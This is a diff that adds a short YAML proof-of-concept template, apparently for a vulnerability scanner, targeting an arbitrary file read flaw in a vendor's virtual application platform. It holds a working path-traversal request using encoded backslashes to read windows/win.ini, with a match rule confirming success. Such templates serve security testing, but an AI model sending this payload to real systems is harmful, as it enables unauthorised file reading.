@@ -1,0 +1,13 @@
+id: poc-yaml-tzkj-VA-virtual-application-platform-arbitrary-file-read
+info:
+  name: 霆智科技 VA虚拟应用平台 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 艾科思应用接入系统
+requests:
+- method: GET
+  path: /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini
+  expression: status_code == 200 && contains(body, "[files]") && contains(body,"[fonts]")
+variables: {}
+transport: http
